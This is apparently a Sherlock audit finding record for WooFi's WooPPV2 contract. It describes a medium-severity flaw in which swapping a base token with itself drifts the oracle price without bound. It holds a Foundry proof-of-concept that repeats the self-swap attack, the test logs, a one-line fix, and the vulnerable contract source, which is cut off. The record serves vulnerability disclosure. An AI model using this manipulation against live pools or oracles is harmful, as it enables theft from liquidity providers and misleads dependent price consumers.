{
  "Title": "M-3: Price manipulation by swapping any ````baseToken```` with itself",
  "Content": "# Issue M-3: Price manipulation by swapping any ````baseToken```` with itself \n\nSource: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/32 \n\n## Found by \nIronsidesec, KingNFT, klaus\n## Summary\n````WooPPV2.swap()```` doesn't forbid the case that ````fromToken == toToken == baseToken````, attackers can make any ````baseToken````'s price unboundedly drifting away by swapping with self.\n\n## Vulnerability Detail\nThe issue arises due to incorrect logic in ````WooPPV2._swapBaseToBase()````:\n1. Firstly, we can see the situation that ````fromToken == toToken == baseToken```` can pass the checks on L521\\~L522.\n2. ````baseToken````'s state & price is cached in memory on L527\\~L528, and updated first time on L541, but the price calculation on L555 still uses the cached state, and the ````newBase2Price```` is set to ````wooracle```` on L556 as the final price after the swap.\n\nAs a result, swapping ````baseToken```` with itself will cause a net price drift rather than keeping price unchanged.\n```solidity\nFile: contracts\\WooPPV2.sol\n513:     function _swapBaseToBase(\n...\n520:     ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {\n521:         require(baseToken1 != address(0) && baseToken1 != quoteToken, \"WooPPV2: !baseToken1\");\n522:         require(baseToken2 != address(0) && baseToken2 != quoteToken, \"WooPPV2: !baseToken2\");\n...\n527:         IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);\n528:         IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);\n...\n539:             uint256 newBase1Price;\n540:             (quoteAmount, newBase1Price) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);\n541:             IWooracleV2(wooracle).postPrice(baseToken1, uint128(newBase1Price));\n...\n554:             uint256 newBase2Price;\n555:             (base2Amount, newBase2Price) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);\n556:             IWooracleV2(wooracle).postPrice(baseToken2, uint128(newBase2Price));\n...\n578:     }\n\n```\n\nThe following coded PoC intuitively shows the problem with a specific case:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Test} from \"../../lib/forge-std/src/Test.sol\";\nimport {console2} from \"../../lib/forge-std/src/console2.sol\";\nimport {WooracleV2_2} from \"../../contracts/wooracle/WooracleV2_2.sol\";\nimport {WooPPV2} from \"../../contracts/WooPPV2.sol\";\nimport {TestERC20Token} from \"../../contracts/test/TestERC20Token.sol\";\nimport {TestUsdtToken} from \"../../contracts/test/TestUsdtToken.sol\";\n\ncontract TestWbctToken is TestERC20Token {\n    function decimals() public view virtual override returns (uint8) {\n        return 8;\n    }\n}\n\ncontract PriceManipulationAttackTest is Test {\n    WooracleV2_2 oracle;\n    WooPPV2 pool;\n    TestUsdtToken usdt;\n    TestWbctToken wbtc;\n    address evil = address(0xbad);\n\n    function setUp() public {\n        usdt = new TestUsdtToken();\n        wbtc = new TestWbctToken();\n        oracle = new WooracleV2_2();\n        pool = new WooPPV2(address(usdt));\n\n        // parameters reference: Integration_WooPP_Fee_Rebate_Vault.test.ts\n        pool.setMaxGamma(address(wbtc), 0.1e18);\n        pool.setMaxNotionalSwap(address(wbtc), 5_000_000e6);\n        pool.setFeeRate(address(wbtc), 25);\n        oracle.postState({_base: address(wbtc), _price: 50_000e8, _spread: 0.001e18, _coeff: 0.000000001e18});\n        oracle.setWooPP(address(pool));\n        oracle.setAdmin(address(pool), true);\n        pool.setWooracle(address(oracle));\n\n        // add some initial liquidity\n        usdt.mint(address(this), 10_000_000e6);\n        usdt.approve(address(pool), type(uint256).max);\n        pool.depositAll(address(usdt));\n\n        wbtc.mint(address(this), 100e8);\n        wbtc.approve(address(pool), type(uint256).max);\n        pool.depositAll(address(wbtc));\n    }\n\n    function testMaxPriceDriftInNormalCase() public {\n        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));\n        assertTrue(feasible);\n        assertEq(initPrice, 50_000e8);\n\n        // buy almost all wbtc in pool\n        usdt.mint(address(this), 5_000_000e6);\n        usdt.transfer(address(pool), 5_000_000e6);\n        pool.swap({\n            fromToken: address(usdt),\n            toToken: address(wbtc),\n            fromAmount: 5_000_000e6,\n            minToAmount: 0,\n            to: address(this),\n            rebateTo: address(this)\n        });\n\n        (uint256 pastPrice, bool feasible2) = oracle.price(address(wbtc));\n        assertTrue(feasible2);\n        uint256 drift = ((pastPrice - initPrice) * 1e5) / initPrice;\n        assertEq(drift, 502); // 0.502%\n        console2.log(\"Max price drift in normal case: \", _toPercentString(drift));\n    }\n\n    function testUnboundPriceDriftInAttackCase() public {\n        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));\n        assertTrue(feasible);\n        assertEq(initPrice, 50_000e8);\n\n        // top up the evil, in real case, the fund could be from a flashloan\n        wbtc.mint(evil, 100e8);\n\n        for (uint256 i; i < 10; ++i) {\n            vm.startPrank(evil);\n            uint256 balance = wbtc.balanceOf(evil);\n            wbtc.transfer(address(pool), balance);\n            pool.swap({\n                fromToken: address(wbtc),\n                toToken: address(wbtc),\n                fromAmount: balance,\n                minToAmount: 0,\n                to: evil,\n                rebateTo: evil\n            });\n            (uint256 pastPrice, bool feasible2) = oracle.price(address(wbtc));\n            assertTrue(feasible2);\n            uint256 drift = ((pastPrice - initPrice) * 1e5) / initPrice;\n            console2.log(\"Unbound price drift in attack case: \", _toPercentString(drift));    \n            vm.stopPrank();\n        }\n    }\n\n    function _toPercentString(uint256 drift) internal pure returns (string memory result) {\n        uint256 d_3 = drift % 10;\n        uint256 d_2 = (drift / 10) % 10;\n        uint256 d_1 = (drift / 100) % 10;\n        uint256 d0 = (drift / 1000) % 10;\n        result = string.concat(_toString(d0), \".\", _toString(d_1), _toString(d_2), _toString(d_3), \"%\");\n        uint256 d = drift / 10000;\n        while (d > 0) {\n            result = string.concat(_toString(d % 10), result);\n            d = d / 10;\n        }\n    }\n\n    function _toString(uint256 digital) internal pure returns (string memory str) {\n        str = new string(1);\n        bytes16 symbols = \"0123456789abcdef\";\n        assembly {\n            mstore8(add(str, 32), byte(digital, symbols))\n        }\n    }\n}\n```\n\nAnd the logs:\n```solidity\n2024-03-woofi-swap\\WooPoolV2> forge test --match-contract PriceManipulationAttackTest -vv\n[⠆] Compiling...No files changed, compilation skipped\n[⠰] Compiling...\n\nRunning 2 tests for test/foundry/PriceManipulationAttack.t.sol:PriceManipulationAttackTest\n[PASS] testMaxPriceDriftInNormalCase() (gas: 158149)\nLogs:\n  Max price drift in normal case:  0.502%\n\n[PASS] testUnboundPriceDriftInAttackCase() (gas: 648243)\nLogs:\n  Unbound price drift in attack case:  0.499%\n  Unbound price drift in attack case:  0.998%\n  Unbound price drift in attack case:  1.496%\n  Unbound price drift in attack case:  1.994%\n  Unbound price drift in attack case:  2.491%\n  Unbound price drift in attack case:  2.988%\n  Unbound price drift in attack case:  3.483%\n  Unbound price drift in attack case:  3.978%\n  Unbound price drift in attack case:  4.473%\n  Unbound price drift in attack case:  4.967%\n\nTest result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.59ms\n\nRan 1 test suites: 2 tests passed, 0 failed, 0 skipped (2 total tests)\n```\n\n\n## Impact\nAcccording ````WooFI```` doc (https://learn.woo.org/v/woofi-dev-docs/resources/on-chain-price-feeds), the ````Wooracle```` is intended to work as a price feed infrastructure for both ````WooFI````'s other components and third parties. This bug would cause all related consumer APPs suffering potential price manipulation attack.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L513\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```diff\n2024-03-woofi-swap\\WooPoolV2> git diff\ndiff --git a/WooPoolV2/contracts/WooPPV2.sol b/WooPoolV2/contracts/WooPPV2.sol\nindex e7a6ae8..9440089 100644\n--- a/WooPoolV2/contracts/WooPPV2.sol\n+++ b/WooPoolV2/contracts/WooPPV2.sol\n@@ -520,6 +520,7 @@ contract WooPPV2 is Ownable, ReentrancyGuard, Pausable, IWooPPV2 {\n     ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {\n         require(baseToken1 != address(0) && baseToken1 != quoteToken, \"WooPPV2: !baseToken1\");\n         require(baseToken2 != address(0) && baseToken2 != quoteToken, \"WooPPV2: !baseToken2\");\n+        require(baseToken1 != baseToken2, \"WooPPV2: baseToken1 == baseToken2\");\n         require(to != address(0), \"WooPPV2: !to\");\n\n         require(balance(baseToken1) - tokenInfos[baseToken1].reserve >= base1Amount, \"WooPPV2: !BASE1_BALANCE\");\n```\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/woonetwork/WooPoolV2/pull/110.\n\n**WangSecurity**\n\nrequest poc\n\n**sherlock-admin2**\n\nPoC request not allowed.\n\n**WangSecurity**\n\nWe decided to downgrade it to med cause the cost of such attack is extremely high.\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/277",
  "Code": [
    {
      "filename": "WooPoolV2/contracts/WooPPV2.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity =0.8.14;\n\n/*\n\n░██╗░░░░░░░██╗░█████╗░░█████╗░░░░░░░███████╗██╗\n░██║░░██╗░░██║██╔══██╗██╔══██╗░░░░░░██╔════╝██║\n░╚██╗████╗██╔╝██║░░██║██║░░██║█████╗█████╗░░██║\n░░████╔═████║░██║░░██║██║░░██║╚════╝██╔══╝░░██║\n░░╚██╔╝░╚██╔╝░╚█████╔╝╚█████╔╝░░░░░░██║░░░░░██║\n░░░╚═╝░░░╚═╝░░░╚════╝░░╚════╝░░░░░░░╚═╝░░░░░╚═╝\n\n*\n* MIT License\n* ===========\n*\n* Copyright (c) 2020 WooTrade\n*\n* Permission is hereby granted, free of charge, to any person obtaining a copy\n* of this software and associated documentation files (the \"Software\"), to deal\n* in the Software without restriction, including without limitation the rights\n* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n* copies of the Software, and to permit persons to whom the Software is\n* furnished to do so, subject to the following conditions:\n*\n* The above copyright notice and this permission notice shall be included in all\n* copies or substantial portions of the Software.\n*\n* THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\nimport \"./interfaces/IWooracleV2.sol\";\nimport \"./interfaces/IWooPPV2.sol\";\nimport \"./interfaces/AggregatorV3Interface.sol\";\nimport \"./interfaces/IWooLendingManager.sol\";\n\nimport {TransferHelper} from \"@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol\";\n\n// OpenZeppelin contracts\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport {ReentrancyGuard} from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {Pausable} from \"@openzeppelin/contracts/security/Pausable.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\n\n// REMOVE IT IN PROD\n// import \"hardhat/console.sol\";\n\n/// @title Woo pool for token swap, version 2.\n/// @notice the implementation class for interface IWooPPV2, mainly for query and swap tokens.\ncontract WooPPV2 is Ownable, ReentrancyGuard, Pausable, IWooPPV2 {\n    /* ----- Type declarations ----- */\n    struct DecimalInfo {\n        uint64 priceDec; // 10**(price_decimal)\n        uint64 quoteDec; // 10**(quote_decimal)\n        uint64 baseDec; // 10**(base_decimal)\n    }\n\n    struct TokenInfo {\n        uint192 reserve; // balance reserve\n        uint16 feeRate; // 1 in 100000; 10 = 1bp = 0.01%; max = 65535\n        uint128 maxGamma; // max range of `balance * k`\n        uint128 maxNotionalSwap; // max volume per swap\n    }\n\n    /* ----- State variables ----- */\n    address constant ETH_PLACEHOLDER_ADDR = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n\n    uint256 public unclaimedFee; // NOTE: in quote token\n\n    // wallet address --> is admin\n    mapping(address => bool) public isAdmin;\n\n    // wallet address --> is pause role\n    mapping(address => bool) public isPauseRole;\n\n    // token address --> fee rate\n    mapping(address => TokenInfo) public tokenInfos;\n\n    /// @inheritdoc IWooPPV2\n    address public immutable override quoteToken;\n\n    IWooracleV2 public wooracle;\n\n    address public feeAddr;\n\n    mapping(address => IWooLendingManager) public lendManagers;\n\n    /* ----- Modifiers ----- */\n\n    modifier onlyAdmin() {\n        require(msg.sender == owner() || isAdmin[msg.sender], \"WooPPV2: !admin\");\n        _;\n    }\n\n    modifier onlyAdminOrPauseRole() {\n        require(msg.sender == owner() || isAdmin[msg.sender] || isPauseRole[msg.sender], \"WooPPV2: !isPauseRole\");\n        _;\n    }\n\n    constructor(address _quoteToken) {\n        quoteToken = _quoteToken;\n    }\n\n    function init(address _wooracle, address _feeAddr) external onlyOwner {\n        require(address(wooracle) == address(0), \"WooPPV2: INIT_INVALID\");\n        wooracle = IWooracleV2(_wooracle);\n        feeAddr = _feeAddr;\n    }\n\n    /* ----- External Functions ----- */\n\n    /// @inheritdoc IWooPPV2\n    function tryQuery(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount\n    ) external view override returns (uint256 toAmount) {\n        if (fromToken == quoteToken) {\n            toAmount = _tryQuerySellQuote(toToken, fromAmount);\n        } else if (toToken == quoteToken) {\n            toAmount = _tryQuerySellBase(fromToken, fromAmount);\n        } else {\n            (toAmount, ) = _tryQueryBaseToBase(fromToken, toToken, fromAmount);\n        }\n    }\n\n    /// @inheritdoc IWooPPV2\n    function query(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount\n    ) external view override returns (uint256 toAmount) {\n        if (fromToken == quoteToken) {\n            toAmount = _tryQuerySellQuote(toToken, fromAmount);\n        } else if (toToken == quoteToken) {\n            toAmount = _tryQuerySellBase(fromToken, fromAmount);\n        } else {\n            uint256 swapFee;\n            (toAmount, swapFee) = _tryQueryBaseToBase(fromToken, toToken, fromAmount);\n            require(swapFee <= tokenInfos[quoteToken].reserve, \"WooPPV2: INSUFF_QUOTE_FOR_SWAPFEE\");\n        }\n        require(toAmount <= tokenInfos[toToken].reserve, \"WooPPV2: INSUFF_BALANCE\");\n    }\n\n    /// @inheritdoc IWooPPV2\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 minToAmount,\n        address to,\n        address rebateTo\n    ) external override returns (uint256 realToAmount) {\n        if (fromToken == quoteToken) {\n            // case 1: quoteToken --> baseToken\n            realToAmount = _sellQuote(toToken, fromAmount, minToAmount, to, rebateTo);\n        } else if (toToken == quoteToken) {\n            // case 2: fromToken --> quoteToken\n            realToAmount = _sellBase(fromToken, fromAmount, minToAmount, to, rebateTo);\n        } else {\n            // case 3: fromToken --> toToken (base to base)\n            realToAmount = _swapBaseToBase(fromToken, toToken, fromAmount, minToAmount, to, rebateTo);\n        }\n    }\n\n    /// @dev OKAY to be public method\n    function claimFee() external nonReentrant {\n        require(feeAddr != address(0), \"WooPPV2: !feeAddr\");\n        uint256 amountToTransfer = unclaimedFee;\n        unclaimedFee = 0;\n        TransferHelper.safeTransfer(quoteToken, feeAddr, amountToTransfer);\n    }\n\n    /// @inheritdoc IWooPPV2\n    /// @dev pool size = tokenInfo.reserve\n    function poolSize(address token) public view override returns (uint256) {\n        return tokenInfos[token].reserve;\n    }\n\n    /// @dev User pool balance (substracted unclaimed fee)\n    function balance(address token) public view returns (uint256) {\n        return token == quoteToken ? _rawBalance(token) - unclaimedFee : _rawBalance(token);\n    }\n\n    function decimalInfo(address baseToken) public view returns (DecimalInfo memory) {\n        return\n            DecimalInfo({\n                priceDec: uint64(10)**(IWooracleV2(wooracle).decimals(baseToken)), // 8\n                quoteDec: uint64(10)**(IERC20Metadata(quoteToken).decimals()), // 18 or 6\n                baseDec: uint64(10)**(IERC20Metadata(baseToken).decimals()) // 18 or 8\n            });\n    }\n\n    /* ----- Admin Functions ----- */\n\n    function setWooracle(address _wooracle) external onlyAdmin {\n        wooracle = IWooracleV2(_wooracle);\n        emit WooracleUpdated(_wooracle);\n    }\n\n    function setFeeAddr(address _feeAddr) external onlyAdmin {\n        feeAddr = _feeAddr;\n        emit FeeAddrUpdated(_feeAddr);\n    }\n\n    function setFeeRate(address token, uint16 rate) external onlyAdmin {\n        require(rate <= 1e5, \"!rate\");\n        tokenInfos[token].feeRate = rate;\n    }\n\n    function setMaxGamma(address token, uint128 maxGamma) external onlyAdmin {\n        tokenInfos[token].maxGamma = maxGamma;\n    }\n\n    function setMaxNotionalSwap(address token, uint128 maxNotionalSwap) external onlyAdmin {\n        tokenInfos[token].maxNotionalSwap = maxNotionalSwap;\n    }\n\n    function setTokenInfo(\n        address token,\n        uint16 _feeRate,\n        uint128 _maxGamma,\n        uint128 _maxNotionalSwap\n    ) external onlyAdmin {\n        tokenInfos[token].feeRate = _feeRate;\n        tokenInfos[token].maxGamma = _maxGamma;\n        tokenInfos[token].maxNotionalSwap = _maxNotionalSwap;\n    }\n\n    function pause() external onlyAdminOrPauseRole {\n        super._pause();\n    }\n\n    function unpause() external onlyAdmin {\n        super._unpause();\n    }\n\n    function setAdmin(address addr, bool flag) external onlyAdmin {\n        require(addr != address(0), \"WooPPV2: !admin\");\n        isAdmin[addr] = flag;\n        emit AdminUpdated(addr, flag);\n    }\n\n    function setPauseRole(address addr, bool flag) external onlyAdmin {\n        isPauseRole[addr] = flag;\n        emit PauseRoleUpdated(addr, flag);\n    }\n\n    function deposit(address token, uint256 amount) public override nonReentrant onlyAdmin {\n        uint256 balanceBefore = balance(token);\n        TransferHelper.safeTransferFrom(token, msg.sender, address(this), amount);\n        uint256 amountReceived = balance(token) - balanceBefore;\n        require(amountReceived >= amount, \"AMOUNT_INSUFF\");\n\n        tokenInfos[token].reserve = uint192(tokenInfos[token].reserve + amount);\n\n        emit Deposit(token, msg.sender, amount);\n    }\n\n    function depositAll(address token) external onlyAdmin {\n        deposit(token, IERC20(token).balanceOf(msg.sender));\n    }\n\n    function repayWeeklyLending(address wantToken) external nonReentrant onlyAdmin returns (uint256 repaidAmount) {\n        IWooLendingManager lendManager = lendManagers[wantToken];\n        lendManager.accureInterest();\n        uint256 amount = lendManager.weeklyRepayment();\n        address repaidToken = lendManager.want();\n        if (amount > 0) {\n            tokenInfos[repaidToken].reserve = uint192(tokenInfos[repaidToken].reserve - amount);\n            TransferHelper.safeApprove(repaidToken, address(lendManager), amount);\n            repaidAmount = lendManager.repayWeekly();\n            TransferHelper.safeApprove(repaidToken, address(lendManager), 0);\n        }\n        emit Withdraw(repaidToken, address(lendManager), amount);\n    }\n\n    function repayPrincipal(address wantToken, uint256 principalAmount)\n        external\n        nonReentrant\n        onlyAdmin\n        returns (uint256 repaidAmount)\n    {\n        IWooLendingManager lendManager = lendManagers[wantToken];\n        lendManager.accureInterest();\n\n        uint256 interest = lendManager.borrowedInterest();\n        uint256 perfFee = (lendManager.perfRate() * interest) / 10000;\n\n        uint256 amount = principalAmount + interest + perfFee;\n\n        address repaidToken = lendManager.want();\n        if (amount > 0) {\n            tokenInfos[repaidToken].reserve = uint192(tokenInfos[repaidToken].reserve - amount);\n            TransferHelper.safeApprove(repaidToken, address(lendManager), amount);\n            repaidAmount = lendManager.repayPrincipal(principalAmount);\n            TransferHelper.safeApprove(repaidToken, address(lendManager), 0);\n        }\n        emit Withdraw(repaidToken, address(lendManager), amount);\n    }\n\n    function withdraw(address token, uint256 amount) public nonReentrant onlyAdmin {\n        require(tokenInfos[token].reserve >= amount, \"WooPPV2: !amount\");\n        tokenInfos[token].reserve = uint192(tokenInfos[token].reserve - amount);\n        TransferHelper.safeTransfer(token, owner(), amount);\n        emit Withdraw(token, owner(), amount);\n    }\n\n    function withdrawAll(address token) external onlyAdmin {\n        withdraw(token, poolSize(token));\n    }\n\n    function skim(address token) public nonReentrant onlyAdmin {\n        TransferHelper.safeTransfer(token, owner(), balance(token) - tokenInfos[token].reserve);\n    }\n\n    function skimMulTokens(address[] memory tokens) external nonReentrant onlyAdmin {\n        unchecked {\n            uint256 len = tokens.length;\n            for (uint256 i = 0; i < len; i++) {\n                skim(tokens[i]);\n            }\n        }\n    }\n\n    function sync(address token) external nonReentrant onlyAdmin {\n        tokenInfos[token].reserve = uint192(balance(token));\n    }\n\n    /* ----- Owner Functions ----- */\n\n    function setLendManager(IWooLendingManager _lendManager) external onlyOwner {\n        lendManagers[_lendManager.want()] = _lendManager;\n        isAdmin[address(_lendManager)] = true;\n        emit AdminUpdated(address(_lendManager), true);\n    }\n\n    function migrateToNewPool(address token, address newPool) external onlyOwner {\n        require(token != address(0), \"WooPPV2: !token\");\n        require(newPool != address(0), \"WooPPV2: !newPool\");\n\n        tokenInfos[token].reserve = 0;\n\n        uint256 bal = balance(token);\n        TransferHelper.safeApprove(token, newPool, bal);\n        WooPPV2(newPool).depositAll(token);\n\n        emit Migrate(token, newPool, bal);\n    }\n\n    function inCaseTokenGotStuck(address stuckToken) external onlyOwner {\n        if (stuckToken == ETH_PLACEHOLDER_ADDR) {\n            TransferHelper.safeTransferETH(msg.sender, address(this).balance);\n        } else {\n            uint256 amount = IERC20(stuckToken).balanceOf(address(this));\n            TransferHelper.safeTransfer(stuckToken, msg.sender, amount);\n        }\n    }\n\n    /* ----- Private Functions ----- */\n\n    function _tryQuerySellBase(address baseToken, uint256 baseAmount)\n        private\n        view\n        whenNotPaused\n        returns (uint256 quoteAmount)\n    {\n        IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);\n        (quoteAmount, ) = _calcQuoteAmountSellBase(baseToken, baseAmount, state);\n        uint256 fee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;\n        quoteAmount = quoteAmount - fee;\n    }\n\n    function _tryQuerySellQuote(address baseToken, uint256 quoteAmount)\n        private\n        view\n        whenNotPaused\n        returns (uint256 baseAmount)\n    {\n        uint256 swapFee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;\n        quoteAmount = quoteAmount - swapFee;\n        IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);\n        (baseAmount, ) = _calcBaseAmountSellQuote(baseToken, quoteAmount, state);\n    }\n\n    function _tryQueryBaseToBase(\n        address baseToken1,\n        address baseToken2,\n        uint256 base1Amount\n    ) private view whenNotPaused returns (uint256 base2Amount, uint256 swapFee) {\n        if (\n            baseToken1 == address(0) || baseToken2 == address(0) || baseToken1 == quoteToken || baseToken2 == quoteToken\n        ) {\n            return (0, 0);\n        }\n\n        IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);\n        IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);\n\n        uint64 spread = _maxUInt64(state1.spread, state2.spread) / 2;\n        uint16 feeRate = _maxUInt16(tokenInfos[baseToken1].feeRate, tokenInfos[baseToken2].feeRate);\n\n        state1.spread = spread;\n        state2.spread = spread;\n\n        (uint256 quoteAmount, ) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);\n\n        swapFee = (quoteAmount * feeRate) / 1e5;\n        quoteAmount = quoteAmount - swapFee;\n\n        (base2Amount, ) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);\n    }\n\n    function _sellBase(\n        address baseToken,\n        uint256 baseAmount,\n        uint256 minQuoteAmount,\n        address to,\n        address rebateTo\n    ) private nonReentrant whenNotPaused returns (uint256 quoteAmount) {\n        require(baseToken != address(0), \"WooPPV2: !baseToken\");\n        require(to != address(0), \"WooPPV2: !to\");\n        require(baseToken != quoteToken, \"WooPPV2: baseToken==quoteToken\");\n\n        require(balance(baseToken) - tokenInfos[baseToken].reserve >= baseAmount, \"WooPPV2: !BASE\");\n\n        {\n            uint256 newPrice;\n            IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);\n            (quoteAmount, newPrice) = _calcQuoteAmountSellBase(baseToken, baseAmount, state);\n            IWooracleV2(wooracle).postPrice(baseToken, uint128(newPrice));\n            // console.log('Post new price:', newPrice, newPrice/1e8);\n        }\n\n        uint256 swapFee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;\n        quoteAmount = quoteAmount - swapFee;\n        require(quoteAmount >= minQuoteAmount, \"WooPPV2: quoteAmount_LT_minQuoteAmount\");\n\n        unclaimedFee = unclaimedFee + swapFee;\n\n        tokenInfos[baseToken].reserve = uint192(tokenInfos[baseToken].reserve + baseAmount);\n        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve - quoteAmount - swapFee);\n\n        if (to != address(this)) {\n            TransferHelper.safeTransfer(quoteToken, to, quoteAmount);\n        }\n\n        emit WooSwap(\n            baseToken,\n            quoteToken,\n            baseAmount,\n            quoteAmount,\n            msg.sender,\n            to,\n            rebateTo,\n            quoteAmount + swapFee,\n            swapFee\n        );\n    }\n\n    function _sellQuote(\n        address baseToken,\n        uint256 quoteAmount,\n        uint256 minBaseAmount,\n        address to,\n        address rebateTo\n    ) private nonReentrant whenNotPaused returns (uint256 baseAmount) {\n        require(baseToken != address(0), \"WooPPV2: !baseToken\");\n        require(to != address(0), \"WooPPV2: !to\");\n        require(baseToken != quoteToken, \"WooPPV2: baseToken==quoteToken\");\n\n        require(balance(quoteToken) - tokenInfos[quoteToken].reserve >= quoteAmount, \"WooPPV2: !QUOTE\");\n\n        uint256 swapFee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;\n        quoteAmount = quoteAmount - swapFee;\n        unclaimedFee = unclaimedFee + swapFee;\n\n        {\n            uint256 newPrice;\n            IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);\n            (baseAmount, newPrice) = _calcBaseAmountSellQuote(baseToken, quoteAmount, state);\n            IWooracleV2(wooracle).postPrice(baseToken, uint128(newPrice));\n            // console.log('Post new price:', newPrice, newPrice/1e8);\n            require(baseAmount >= minBaseAmount, \"WooPPV2: baseAmount_LT_minBaseAmount\");\n        }\n\n        tokenInfos[baseToken].reserve = uint192(tokenInfos[baseToken].reserve - baseAmount);\n        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve + quoteAmount);\n\n        if (to != address(this)) {\n            TransferHelper.safeTransfer(baseToken, to, baseAmount);\n        }\n\n        emit WooSwap(\n            quoteToken,\n            baseToken,\n            quoteAmount + swapFee,\n            baseAmount,\n            msg.sender,\n            to,\n            rebateTo,\n            quoteAmount + swapFee,\n            swapFee\n        );\n    }\n\n    function _swapBaseToBase(\n        address baseToken1,\n        address baseToken2,\n        uint256 base1Amount,\n        uint256 minBase2Amount,\n        address to,\n        address rebateTo\n    ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {\n        require(baseToken1 != address(0) && baseToken1 != quoteToken, \"WooPPV2: !baseToken1\");\n        require(baseToken2 != address(0) && baseToken2 != quoteToken, \"WooPPV2: !baseToken2\");\n        require(to != address(0), \"WooPPV2: !to\");\n\n        require(balance(baseToken1) - tokenInfos[baseToken1].reserve >= base1Amount, \"WooPPV2: !BASE1_BALANCE\");\n\n        IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);\n        IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);\n\n        uint256 swapFee;\n        uint256 quoteAmount;\n        {\n            uint64 spread = _maxUInt64(state1.spread, state2.spread) / 2;\n            uint16 feeRate = _maxUInt16(tokenInfos[baseToken1].feeRate, tokenInfos[baseToken2].feeRate);\n\n            state1.spread = spread;\n            state2.spread = spread;\n\n            uint256 newBase1Price;\n            (quoteAmount, newBase1Price) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);\n            IWooracleV2(wooracle).postPrice(baseToken1, uint128(newBase1Price));\n            // console.log('Post new base1 price:', newBase1Price, newBase1Price/1e8);\n\n            swapFee = (quoteAmount * feeRate) / 1e5;\n        }\n\n        quoteAmount = quoteAmount - swapFee;\n        unclaimedFee = unclaimedFee + swapFee;\n\n        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve - swapFee);\n        tokenInfos[baseToken1].reserve = uint192(tokenInfos[baseToken1].reserve + base1Amount);\n\n        {\n            uint256 newBase2Price;\n            (base2Amount, newBase2Price) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);\n            IWooracleV2(wooracle).postPrice(baseToken2, uint128(newBase2Price));\n            // console.log('Post new base2 price:', newBase2Price, newBase2Price/1e8);\n            require(base2Amount >= minBase2Amount, \"WooPPV2: base2Amount_LT_minBase2Amount\");\n        }\n\n        tokenInfos[baseToken2].reserve = uint192(tokenInfos[baseToken2].reserve - base2Amount);\n\n        if (to != address(this)) {\n            TransferHelper.safeTransfer(baseToken2, to, base2Amount);\n        }\n\n        emit WooSwap(\n            baseToken1,\n            baseToken2,\n            base1Amount,\n            base2Amount,\n            msg.sender,\n            to,\n            rebateTo,\n            quoteAmount + swapFee,\n            swapFee\n        );\n    }\n\n    /// @dev Get the pool's balance of the specified token\n    /// @dev This function is gas optimized to avoid a redundant extcodesize check in addition to the returndatasize\n    /// @dev forked and curtesy by Uniswap v3 core\n    function _rawBalance(address token) private view returns (uint256) {\n        (bool success, bytes memory data) = token.staticcall(\n            abi.encodeWithSelector(IERC20.balanceOf.selector, address(this))\n        );\n        require(success && data.length >= 32, \"WooPPV2: !BALANCE\");\n        return abi.decode(data, (uint256));\n    }\n\n    function _calcQuoteAmountSellBase(\n        address baseToken,\n        uint256 